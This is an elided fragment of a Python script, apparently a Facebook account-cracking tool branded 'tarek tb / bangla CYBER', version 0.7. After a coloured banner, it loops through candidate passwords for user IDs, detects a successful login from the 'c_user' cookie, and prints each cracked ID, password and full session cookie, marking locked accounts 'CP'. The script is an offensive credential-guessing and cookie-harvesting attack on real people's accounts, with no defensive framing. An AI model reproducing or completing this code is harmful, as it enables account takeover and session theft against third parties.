...
\033[1;94m       [+]===============================================[+]
\033[1;94m       [+]        CREATED BY   :  tarek tb               \033[1;94m[+]
\033[1;94m       [+]        ON GITHUB    :  tarek raj               \033[1;94m[+]
\033[1;94m       [+]        TEAM         :  bangla  CYBER        \033[1;94m[+]
\033[1;94m       [+]        TOOL VERSION :  0.7                    \033[1;94m[+]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[tarek-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[tarek-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[tarek🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
